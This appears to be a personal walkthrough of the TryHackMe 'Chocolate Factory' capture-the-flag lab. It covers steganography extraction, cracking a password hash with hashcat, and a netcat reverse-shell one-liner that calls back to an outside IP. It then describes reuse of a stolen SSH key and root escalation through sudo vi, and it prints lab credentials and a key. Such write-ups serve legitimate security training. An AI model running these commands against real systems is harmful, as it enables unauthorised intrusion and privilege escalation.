#elf 

https://tryhackme.com/r/room/chocolatefactory

---
#### Nmap
![[Screenshot_2024-06-01_21-25-42.png]]
Wonderful

On the ftp I found an image `gum_room.jpg` and I could extract a `b64.txt` file in it:
```shell
steghide extract -sf gum_room.jpg
```

In this file, there was a base64 encoded string which gave me the `/etc/passwd` file of the server with the username `charlie` and a hash I cracked using hashcat:
```shell
hashcat -a 0 -m 1800 -O hash /usr/share/wordlists/rockyou.txt
```

It gave me the password `cn7824`, did not work through ssh but it worked for the login page on port `80`.
This leaded me to a page with a console command so I putted my reverse shell:
```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.79.56 9001 >/tmp/f
```

And here I am in

I download the private key `/home/charlie/teleport` and I used it to connect by ssh after setting the correct permissions to `600`:
```shell
ssh charlie@10.10.249.187 -i teleport
```

And here I am in as Charlie

There are 2 interresting places
```text
/etc/init.d/ports.sh  
/etc/init.d/chocolate.txt
```

And another interresting `ELF` file:
```text
/var/www/html/key_rev_key
```

Ok so I downloaded the `key_rev_key` file and I executed it. It asked me for a name so I used `strings` to watch in the file
```shell
strings key_rev_key
```
And it gave me the key
![[Screenshot_2024-06-01_22-34-20.png]]

Then I finally decided to `sudo -l` and I had sudo permission on `vi`, it's an easy escalation to root with `:shell`

And here I am root, I just had to put the key `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='` in the python file on `/root`

